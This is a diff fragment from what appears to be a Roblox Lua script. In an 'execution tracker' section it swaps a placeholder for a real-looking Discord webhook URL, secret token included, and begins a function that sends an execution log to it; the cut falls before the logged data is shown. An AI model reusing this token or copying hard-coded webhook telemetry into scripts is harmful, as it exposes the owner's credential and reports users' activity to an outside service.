@@ -16,7 +16,7 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 -- EXECUTION TRACKER
 local HttpService = game:GetService("HttpService")
 
-local WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1555302864987889704/kWT_Mr3S7hOzrgNv-h6JUyF98167z7Bwsfwtih9dge_YjHfIdkFw36tCwVkWmLSzYuKC"
 
 local function SendExecutionLog()
 	local data = {
